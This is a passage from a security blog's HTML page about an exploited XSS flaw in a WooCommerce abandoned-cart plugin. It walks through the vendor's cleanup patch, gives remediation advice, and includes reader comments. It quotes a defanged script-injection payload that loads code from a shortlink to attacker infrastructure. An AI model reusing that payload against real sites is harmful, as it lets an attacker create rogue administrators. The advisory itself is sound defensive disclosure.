                    billing_address_2 = IF (billing_address_2 LIKE '%&lt;%', '', billing_address_2),
                    billing_city = IF (billing_city LIKE '%&lt;%', '', billing_city),
                    billing_county = IF (billing_county LIKE '%&lt;%', '', billing_county),
                    billing_zipcode = IF (billing_zipcode LIKE '%&lt;%', '', billing_zipcode),
                    email_id = IF (email_id LIKE '%&lt;%', '', email_id),
                    phone = IF (phone LIKE '%&lt;%', '', phone),
                    ship_to_billing = IF (ship_to_billing LIKE '%&lt;%', '', ship_to_billing),
                    order_notes = IF (order_notes LIKE '%&lt;%', '', order_notes),
                    shipping_first_name = IF (shipping_first_name LIKE '%&lt;%', '', shipping_first_name),
                    shipping_last_name = IF (shipping_last_name LIKE '%&lt;%', '', shipping_last_name),
                    shipping_company_name = IF (shipping_company_name LIKE '%&lt;%', '', shipping_company_name),
                    shipping_address_1 = IF (shipping_address_1 LIKE '%&lt;%', '', shipping_address_1),
                    shipping_address_2 = IF (shipping_address_2 LIKE '%&lt;%', '', shipping_address_2),
                    shipping_city = IF (shipping_city LIKE '%&lt;%', '', shipping_city),
                    shipping_county = IF (shipping_county LIKE '%&lt;%', '', shipping_county)&quot;;

                $wpdb-&gt;query( $query_cleanup );

                $email = 'woouser401a@mailinator.com';
                $exists = email_exists( $email );
                if ( $exists ) {
                    wp_delete_user( esc_html( $exists ) );
                }

                update_option( 'ac_lite_user_cleanup', 'yes' );
            }</pre>
<p>In a rather direct attempt to address the active exploitation of this vulnerability, the developers also implemented a cleanup function in the patched version of their plugin. This function first performs a scan of the existing abandoned cart data, and removes any entries where aÂ <code>&lt;</code> symbol is encountered, which prevents subsequent execution of the maliciousÂ <code>&lt;script src=hXXps://bit[.]ly/2SzpVBY&gt;&lt;/script&gt;</code>Â payloads that may be present.</p>
<p>The next block of code is the interesting one, though. Because the plugin&#8217;s developers were made aware of this flaw due to reports of these same exploits, they include a check for the existence of the email address registered with the malicious &#8220;woouser&#8221; account. If a user with this email is identified, the plugin deletes that user.</p>
<h2>Next Steps</h2>
<p>While these are clever steps in addressing current incarnations of this campaign, it&#8217;s important that site owners don&#8217;t rely on these measures alone. This patch does not detect or remove the secondary backdoors injected into inactive plugins, and the nature of the initial XSS payload allows the email address of newly created rogue admins to be changed with very little effort by modifying theÂ <code>visionstat.js</code> script hosted on the C2 site, or by changing the target of the bit.ly shortlink. The patch also leaves output sanitization untouched, meaning preexisting injected scripts can still execute in the dashboard if the cleanup function fails to remove them for any reason.</p>
<p>Our recommendation for site owners using eitherÂ <code>woocommerce-abandoned-cart</code> orÂ <code>woocommerce-abandoned-cart-pro</code> is to review their database contents for possible script injections. The exact name of the table to check will vary depending on your database prefix and the Lite/Pro status of your installed plugin, but guest shopper data can be found in the table withÂ <code>ac_guest_abandoned_cart_history</code>Â in its name.Â After this check has been completed, review the user accounts present on your site. If any unauthorized administrator accounts are present, delete them immediately and begin your <a href="https://www.wordfence.com/blog/2018/07/three-incident-response-preparations-you-should-be-making/" target="_blank" rel="noopener">incident response process</a>.</p>
<p>The good news for current Wordfence users is that these attacks are blocked by the XSS protection present in both the free and premium versions of our firewall. If you used one of these abandoned cart plugins and were not a Wordfence user prior to this patch, installing Wordfence and running a scan will tell you whether you have been hacked. Also consider reaching out to our team for aÂ <a href="https://www.wordfence.com/site-security-audit/" target="_blank" rel="noopener">Site Security Audit</a>, which includes a free year of Wordfence Premium in addition to the peace of mind provided by the audit itself.</p>
<p>Despite the release of a patch, these attacks are still ongoing and our investigation reveals new sites compromised daily. Please consider sharing this post as a public service announcement, to improve community awareness of these attacks and prompt updates for those who need them. As always, thank you for reading.</p>
            </div>
            <div class="col-12 col-lg-4 px-0">
                <form class="d-flex my-4 ml-0 ml-lg-5 p-4 bg-light" role="search" method="get" action="https://www.wordfence.com/">
    <input name="s" class="form-control mr-2" type="search" placeholder="Search the blog" aria-label="Search" value="">
    <button class="btn btn-outline-dark" type="submit">Search</button>
</form>
<div class="blog-post-sidebar ml-0 ml-lg-5">
    <div class="product product-free">
        <div class="m-auto pb-4 logo">
            <svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 414.02 324.89">
    <path style="fill: #fff; stroke-width: 0px;" d="M191.43,227.68s.05,0,.07,0c-.02,0-.05,0-.07,0h0Z"/>
    <path style="fill: #218dc1; stroke-width: 0px;" d="M207.01,62.1h0s21.47,47.18,21.47,47.18l.2.45-7.33.03c0,.06.02.12.03.18.11.7.21,1.41.21,2.14,0,2.31-.6,4.47-1.62,6.38-.47.89-1.03,1.72-1.66,2.49,0,0-.96,10.31-.86,29.46,0,.02,0,.04,0,.06.06,11.48.7,28.44,2.04,46.99,22.45,1.27,43.34,3.83,62.51,7.17v-80.08s-5.6-.02-5.6-.02l14.33-31.47,13.75,31.59-5.6-.02v83.23c20.44,4.25,38.61,9.3,54.3,14.44v-69.73s-5.6-.02-5.6-.02l14.33-31.47,13.75,31.59-5.6-.02v75.55c18.59,6.88,32.46,13.41,41.02,17.79,10.69-100.86-11.21-188.35-11.21-188.35C297.8,54.32,207.01,0,207.01,0v62.1Z"/>
    <path style="fill: #218dc1; stroke-width: 0px;" d="M370.06,246.05v78.85h9.99s2.37,0,2.37,0h6.16s5.33,0,5.33,0c3.37-10.93,6.28-22.17,8.72-33.16h0c3.05-11.02,4.91-20.06,6.02-26.6,0,0,.05-.25.06-.37.07-.42.14-.82.2-1.21-5.96-3.22-19.27-9.97-38.86-17.52Z"/>
    <path style="fill: #218dc1; stroke-width: 0px;" d="M298.88,224.89v100h9.97s18.42,0,18.42,0h0s9.64,0,9.64,0h16.26v-84.97c-15.46-5.26-33.67-10.55-54.3-15.03Z"/>
    <path style="fill: #218dc1; stroke-width: 0px;" d="M281.99,324.89v-103.37c-18.74-3.41-39.19-6.05-61.15-7.4,0,.09.02.17.02.26.04.42,1.44,11.45,1.66,13.3,3.42,25.52,10.34,65.79,17.4,97.16h-.35s0,.04.01.06h0s34.84,0,34.84,0h0s7.57,0,7.57,0Z"/>
    <path style="fill: #1a719d; stroke-width: 0px;" d="M174.09,324.84c7.07-31.38,13.98-71.64,17.4-97.16-.02,0-.05,0-.07,0h0s.05,0,.07,0c.22-1.86,1.61-12.88,1.66-13.3,0-.09.02-.17.02-.26-22.1,1.36-42.58,4.03-61.15,7.4v103.38h0s7.57,0,7.57,0h0s34.84,0,34.84,0h0s0-.04.01-.06h-.35Z"/>
    <path style="fill: #1a719d; stroke-width: 0px;" d="M43.96,228.18v-75.55s-5.6.02-5.6.02l13.75-31.59,14.33,31.47-5.6.02v69.73c15.69-5.13,33.86-10.19,54.3-14.44v-83.23s-5.6.02-5.6.02l13.75-31.59,14.33,31.47-5.6.02v80.08c19.17-3.34,40.06-5.9,62.51-7.17,1.34-18.55,1.98-35.52,2.04-46.99,0-.02,0-.04,0-.06.09-19.15-.86-29.46-.86-29.46-.64-.76-1.19-1.6-1.66-2.49-1.02-1.91-1.62-4.06-1.62-6.38,0-.73.09-1.44.21-2.14,0-.06.02-.12.03-.18l-7.33-.03.2-.45,21.47-47.16h0V0S116.22,54.32,14.16,57.62c0,0-21.91,87.49-11.21,188.35,8.55-4.38,22.43-10.91,41.02-17.79Z"/>
    <path style="fill: #1a719d; stroke-width: 0px;" d="M60.84,239.83v85.06s16.26,0,16.26,0h9.64s18.42,0,18.42,0h0s9.97,0,9.97,0h0s0-100.03,0-100.03c-21.37,4.61-39.65,9.99-54.3,14.97Z"/>
    <path style="fill: #1a719d; stroke-width: 0px;" d="M5.1,263.55s0,0,0,0c.06.4.13.8.2,1.22.02.12.04.25.05.37,0,0,0,0,0,0,1.12,6.54,2.97,15.58,6.02,26.6h0c2.44,10.99,5.35,22.22,8.72,33.15h5.33s8.54,0,8.54,0h0s9.99,0,9.99,0v-78.94c-19.54,7.55-32.88,14.35-38.85,17.59Z"/>
</svg>
        </div>
        <h3>Trust Your Site <br>to the Leader in WordPress Security</h3>
        <p>Wordfence includes an endpoint firewall, malware scanner, robust login security features, live traffic views, and more. Discover why over 5 million WordPress sites put their trust in Wordfence.</p>
        <a href="/products/pricing/" target="_blank" class="btn btn-outline-primary">
            Protect Your Site        </a>
    </div>
</div>
            </div>
        </div>
	</div>
</section>
<section class="blog-post-share">
	<div class="container">
		<div class="fm_social_share">
	<p><strong>Did you enjoy this post? Share it!</strong></p>
	<div class="fm_social_share--buttons">
		<a class="fm_social_share_buttons-button fm_social_share_buttons-button--facebook" href="http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2019%2F03%2Fxss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers%2F" onclick='javascript:window.open(this.href, "", "menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=200,width=450");return false;'><span class="fm_social_share_button-ico"></span><em>Facebook</em><strong>&nbsp;</strong></a>
		<a class="fm_social_share_buttons-button fm_social_share_buttons-button--twitter" href="https://twitter.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2019%2F03%2Fxss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers%2F&amp;text=XSS%20Vulnerability%20in%20Abandoned%20Cart%20Plugin%20Leads%20To%20WordPress%20Site%20Takeovers&amp;via=wordfence" onclick='javascript:window.open(this.href, "", "menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600");return false;'><span class="fm_social_share_button-ico"></span><em>Twitter</em><strong>&nbsp;</strong></a>
		<a class="fm_social_share_buttons-button fm_social_share_buttons-button--linkedin" href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2019%2F03%2Fxss-flaw-in-abandoned-cart-plugin-leads-to-wordpress-site-takeovers%2F" onclick='javascript:window.open(this.href, "", "menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600");return false;'><span class="fm_social_share_button-ico"></span><em>LinkedIn</em><strong>&nbsp;</strong></a>
	</div>
	<div class="clearfix"></div>
</div>	</div>
</section>

<section class="blog-post-comments">
	<div class="container">
		<div class="row">
	<div class="col">
		<h2>Comments</h2>
		<div class="comments-count">6 Comments</div>
		<ul class="comments-body">
		<li class="comment even thread-even depth-1" id="comment-79964">
		<div class="comment-body" v-pre="">
		<div class="comment-metadata">
			<div class="comment-author-avatar"><img alt='' src='https://secure.gravatar.com/avatar/536f115f7a7eee5a3c6d9d7162525296?s=96&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/536f115f7a7eee5a3c6d9d7162525296?s=192&#038;d=mm&#038;r=g 2x' class='avatar avatar-96 photo' height='96' width='96' loading='lazy' decoding='async'/></div>
			<div class="comment-metadata-content">
				<div class="comment-author-name">End User</div>
				<div class="comment-date">March 11, 2019 <br> 12:09 pm</div>
			</div>
					</div>
		<div class="comment-content"><p>Their response is pretty bad- they're not even sanitizing the inputs, they're just checking to see if *this* particular exploit is being used. Very, very poor programming practice. And not to put too fine a point on it, but it's inexcusable not to sanitize EVERY input no matter what it is. Shame on these 'programmers'.</p>
</div>
	</div>
</li>
<ul class="children">
<li class="comment odd alt depth-2" id="comment-79966">
		<div class="comment-body" v-pre="">
		<div class="comment-metadata">
			<div class="comment-author-avatar"><img alt='' src='https://secure.gravatar.com/avatar/3abee770b109d3f71e8d70249469ee58?s=96&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3abee770b109d3f71e8d70249469ee58?s=192&#038;d=mm&#038;r=g 2x' class='avatar avatar-96 photo' height='96' width='96' loading='lazy' decoding='async'/></div>
			<div class="comment-metadata-content">
				<div class="comment-author-name">Mikey Veenstra</div>
				<div class="comment-date">March 11, 2019 <br> 12:57 pm</div>
			</div>
					</div>
		<div class="comment-content"><p>Hi there! In the patched version, the inputs are indeed sanitized with WordPress's built-in <code>sanitize_text_field</code> function. I will update the post to ensure this is made clearer. </p>
<p>Sorry for any confusion!</p>
</div>
	</div>
</li>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="comment-79994">
		<div class="comment-body" v-pre="">
		<div class="comment-metadata">
			<div class="comment-author-avatar"><img alt='' src='https://secure.gravatar.com/avatar/937b6bdd20b7f471fb0229a7a2f08e3c?s=96&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/937b6bdd20b7f471fb0229a7a2f08e3c?s=192&#038;d=mm&#038;r=g 2x' class='avatar avatar-96 photo' height='96' width='96' loading='lazy' decoding='async'/></div>
			<div class="comment-metadata-content">
				<div class="comment-author-name">tom</div>
				<div class="comment-date">March 11, 2019 <br> 9:13 pm</div>
			</div>
					</div>
		<div class="comment-content"><p>Thank You for sharing.</p>
</div>
	</div>
</li>
</li><!-- #comment-## -->
<li class="comment odd alt thread-even depth-1" id="comment-80025">
		<div class="comment-body" v-pre="">
		<div class="comment-metadata">
			<div class="comment-author-avatar"><img alt='' src='https://secure.gravatar.com/avatar/303cac30a48dba6130bdc2f341a4444b?s=96&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/303cac30a48dba6130bdc2f341a4444b?s=192&#038;d=mm&#038;r=g 2x' class='avatar avatar-96 photo' height='96' width='96' loading='lazy' decoding='async'/></div>
			<div class="comment-metadata-content">
				<div class="comment-author-name">Vishal Kothari</div>
				<div class="comment-date">March 12, 2019 <br> 5:59 am</div>
			</div>
					</div>
		<div class="comment-content"><p>I am from the Tyche team, the authors of the Abandoned Cart plugin.</p>
<p>This vulnerability was found &amp; is exactly like it is described in this post. A patch was implemented from 48 hours of it being reported. The plugin was also scanned for any other such instances, and no other vulnerability was found.</p>
<p>After the release, the plugin is no longer being used to compromise the sites. This has been confirmed to us by multiple customers who are using the plugin, including those who reported it. You can email me on the email associated with this comment if you have reason to believe otherwise. I have also dropped an email from your contact page.</p>
</div>
	</div>
</li>
<ul class="children">
<li class="comment even depth-2" id="comment-80047">
		<div class="comment-body" v-pre="">
		<div class="comment-metadata">
			<div class="comment-author-avatar"><img alt='' src='https://secure.gravatar.com/avatar/3abee770b109d3f71e8d70249469ee58?s=96&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3abee770b109d3f71e8d70249469ee58?s=192&#038;d=mm&#038;r=g 2x' class='avatar avatar-96 photo' height='96' width='96' loading='lazy' decoding='async'/></div>
			<div class="comment-metadata-content">
				<div class="comment-author-name">Mikey Veenstra</div>
				<div class="comment-date">March 12, 2019 <br> 10:40 am</div>
			</div>
					</div>
		<div class="comment-content"><p>Hi Vishal,</p>
<p>You are correct that patched versions of the plugin are no longer susceptible to these flaws. However, releasing a patch doesn't remove a vulnerability from the wild. According to metrics on the plugin repository, more than half of the plugin's install base is running a vulnerable version of the software. These sites are indeed under active attack and compromises continue.</p>
</div>
	</div>
</li>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-80243">
		<div class="comment-body" v-pre="">
		<div class="comment-metadata">
			<div class="comment-author-avatar"><img alt='' src='https://secure.gravatar.com/avatar/f6254feda428f3aadb82a3ddafed2100?s=96&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f6254feda428f3aadb82a3ddafed2100?s=192&#038;d=mm&#038;r=g 2x' class='avatar avatar-96 photo' height='96' width='96' loading='lazy' decoding='async'/></div>
			<div class="comment-metadata-content">
				<div class="comment-author-name">Ben Lacey</div>
				<div class="comment-date">March 15, 2019 <br> 7:24 am</div>
			</div>
					</div>
		<div class="comment-content"><p>Hi Wordfence,</p>
<p>Thanks for publishing this article, it is very thorough about the issue and potential problems.</p>
<p>We will inform our customer base if they use this plugin and help them to update their websites with the patched version.</p>
<p>Ben</p>
</div>
	</div>
</li>
</li><!-- #comment-## -->
		</ul>
	</div>
</div>
			</div>
</section>

<section class="footer-hero footer-hero-mailing-list footer-hero-circles">
	<div class="container container-tall">
		<div class="row align-items-center">
			<div class="col">
				<h3>Breaking WordPress Security Research in your inbox as it happens.</h3>
				<hubspot-form appearance="light"></hubspot-form>			</div>
			<div class="col footer-hero-mailing-list-image">
				<img src="/img/footer-news-example.jpg" alt="Example of a news story">
			</div>
		</div>
	</div>
</section><!-- /.hero -->

<site-footer-business-hours></site-footer-business-hours>
<site-footer-bar :logged-in="loggedIn"></site-footer-bar>
<site-footer-menu :logged-in="loggedIn"></site-footer-menu>
<frontend-modals></frontend-modals>
</div>
<script>
window.uiSettings = {"premium-price-increase-notice-cart":"","premium-price-increase-notice-general":"","vuln-db":{"search-results-per-page":"20","affected-software-per-page":"20"},"enable-multi-payment-orders":false};
window.availableProducts = {"license-free":{"product":"license","product_type":"free","unit_price":0,"title_short":"Free","id":"license-free"},"license-premium":{"product":"license","product_type":"premium","unit_price":149,"title_short":"Premium","id":"license-premium"},"license-care":{"product":"license","product_type":"care","unit_price":590,"title_short":"Care","id":"license-care"},"license-response":{"product":"license","product_type":"response","unit_price":1250,"title_short":"Response","id":"license-response"},"license-cli-premium":{"product":"license","product_type":"cli-premium","unit_price":149,"title_short":"CLI Premium","id":"license-cli-premium"},"license-intelligence":{"product":"license","product_type":"intelligence","unit_price":-1,"title_short":"Intelligence","id":"license-intelligence"}};
</script>
<!--[if lte IE 8]>
<script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2-legacy.js"></script>
<![endif]-->
<script charset="utf-8" type="text/javascript" src="https://js.hsforms.net/forms/v2.js"></script>
<script>
  hbspt.forms.create({
    region: "na1",
    portalId: "4354010",
	formId: "48879c4e-e765-4695-bb7a-8b27b43e1217",
	target: "#cli-terms-registration-form"
  });
</script><script type="text/x-template" id="modal-template">
	<transition name="modal">
		<div @click="close" class="modal-mask">
			<div class="modal" tabindex="-1" role="dialog" aria-labelledby="modal-title">
				<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
					<div @click.stop class="modal-content">
						<div class="modal-header">
							<h3 class="modal-title" id="modal-title">
								<slot name="header">Modal Title</slot>
							</h3>
							<button @click="close" type="button" class="close" aria-label="Close">
								<span>&times;</span>
							</button>
						</div>
						<div class="modal-body">
							<slot name="body">Modal Body</slot>
						</div>
						<div class="modal-footer">
							<slot name="footer">Modal Footer</slot>
						</div>
					</div>
				</div>
			</div>
		</div>
	</transition>
</script>
<div class="wf-cookie-consent-container">
		<div class="wf-cookie-consent">
		<div class="content">
			<p class="wf-cookie-message">This site uses cookies in accordance with our <a href="/privacy-policy">Privacy Policy</a>.</p>
			<div class="wf-cookie-actions">
				<button class="wf-cookie-options">Cookie Settings</button>
				<button class="wf-cookie-accept">Accept All</button>
			</div>
		</div>
	</div>
		<div class="wf-cookie-consent-options" style="display: none">
		<div class="content">
			<h2>Cookie Options<button class="dismiss"><span class="icon-x"></span></button></h2>
			<div class="body">
				<p>For additional information on how this site uses cookies, please review our <a href="/privacy-policy">Privacy Policy</a>. The cookies used by this site are classified into the following categories and can be configured below.</p>
									<div class="category">
						<h3>Strictly Necessary</h3>
						<p>These Cookies are necessary for the Sites and Services to work properly. They include any essential authentication and authorization cookies for the Services.</p>
						<button class="category-toggle" data-key="necessary" data-state="true"  disabled></button>
												<p><small>* Cookies of this category are necessary for the site to function and cannot be disabled.</small></p>
											</div>
									<div class="category">
						<h3>Performance/Analytical</h3>
						<p>These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.</p>
						<button class="category-toggle" data-key="analytical" data-state="false" ></button>
											</div>
									<div class="category">
						<h3>Targeting</h3>
						<p>These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.</p>
						<button class="category-toggle" data-key="targeting" data-state="false" ></button>
											</div>
								<div class="actions">
					<button class="dismiss">Cancel</button>
					<button class="save">Save</button>
				</div>
			</div>
		</div>
	</div>
</div>
<script>
window.wfConsentChanged = function(onUserConsent) { //The Google Tag Manager consent manager will call this function to set the callback to be used when the user updates their consent state
	window.wfConsentChangedCallback = onUserConsent;
};

(function($) {
	$('body').css('margin-bottom', $('.wf-cookie-consent').outerHeight() + "px");
	var ajaxEndpoint = "https:\/\/www.wordfence.com\/wp-admin\/admin-ajax.php";
	var enabledLabel = "On";
	var disabledLabel = "Off";
	var optionsDialog = $('.wf-cookie-consent-options');
	var toggles = optionsDialog.find('.category-toggle');
	toggles.each(function() {
		$(this).append($('<span>').addClass('state-label'));
	});
	function updateState(toggle) {
		var state = toggle.data('state');
		toggle.find('.state-label').text(state ? enabledLabel : disabledLabel);
		toggle.toggleClass('enabled', state);
		toggle.toggleClass('disabled', !state);
	}
	function setCategoryStates() {
		toggles.each(function() {
			updateState($(this));
		});
	}
	function getConfiguredState() {
		var state = {};
		toggles.each(function() {
			var toggle = $(this);
			if (!toggle.is(':disabled')) {
				var key = toggle.data('key');
				var categoryState = toggle.data('state');
				state[key] = categoryState;
			}
		});
		return state;
	}
	function updateConsentState(state, callback) {
		$.post(
			ajaxEndpoint,
			{
				action: 'update_cookie_consent',
				state: state,
				url: window.location.href
			},
			function() {
				typeof window.wfConsentChangedCallback === 'function' && window.wfConsentChangedCallback(state);
				$('.wf-cookie-consent').hide();
				callback();
			}
		);
	}
	function showCookieConsentOptions() {
		setCategoryStates();
		optionsDialog.show();
		$('body').addClass('wf-cookie-options-dialog');
	}
	function hideCookieConsentOptions() {
		optionsDialog.hide();
		$('body').removeClass('wf-cookie-options-dialog');
	}
	toggles.on('click', function() {
		var toggle = $(this);
		var state = !toggle.data('state');
		toggle.data('state', state);
		updateState(toggle);
	});
	$('.wf-cookie-options').on('click', showCookieConsentOptions);
	$.showCookieConsentOptions = showCookieConsentOptions;
	optionsDialog.find('.dismiss').on('click', function() {
		hideCookieConsentOptions();
	});
	optionsDialog.find('.save').on('click', function() {
		updateConsentState(getConfiguredState(), function() {
			hideCookieConsentOptions();
		});
	});
	optionsDialog.find('.content').on('click', function(e) {
		e.stopPropagation();
	});
	optionsDialog.on('click', function(e) {
		hideCookieConsentOptions();
	});
	$('.wf-cookie-accept').on('click', function() {
		updateConsentState({"analytical":true,"targeting":true}, function() {
			hideCookieConsentOptions();
		});
	});
})(jQuery);</script>
<script type="text/javascript" src="https://www.wordfence.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9b" id="syntaxhighlighter-core-js"></script>
<script type="text/javascript" src="https://www.wordfence.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPhp.js?ver=3.0.9b" id="syntaxhighlighter-brush-php-js"></script>
<script type="text/javascript" src="https://www.wordfence.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushJScript.js?ver=3.0.9b" id="syntaxhighlighter-brush-jscript-js"></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://www.wordfence.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.head.appendChild( corecss );
		var themecssurl = "https://www.wordfence.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		document.head.appendChild( themecss );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

	// Infinite scroll support
	if ( typeof( jQuery ) !== 'undefined' ) {
		jQuery( function( $ ) {
			$( document.body ).on( 'post-load', function() {
				SyntaxHighlighter.highlight();
			} );
		} );
	}
</script>
<script type="text/javascript" id="wordfence-metrics-js-extra">
/* <![CDATA[ */
var WFMVars = {"ajaxURL":"https:\/\/www.wordfence.com\/wp-admin\/admin-ajax.php","nonce":"0749263a28"};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.wordfence.com/wp-content/plugins/wordfence-metrics/js/jquery.barrating.min.js?ver=1.2.1" id="jquery.barrating-js"></script>
<script type="text/javascript" src="https://www.wordfence.com/wp-content/plugins/wordfence-metrics/js/wordfence-metrics.js?ver=1.0.0" id="wordfence-metrics-js"></script>
<script type="text/javascript" src="https://www.wordfence.com/js/site.js?id=efeacc00654d76924588" id="laravel-js-js"></script>
<script type="text/javascript" src="https://www.wordfence.com/wp-content/themes/wordfence2020/js/app.js?ver=1736280594" id="app-js"></script>
<script type="text/javascript" src="https://www.wordfence.com/wp-content/themes/wordfence2020/js/vendor/jquery.customSelect.min.js?ver=1" id="customSelect-js"></script>
</body>
</html>
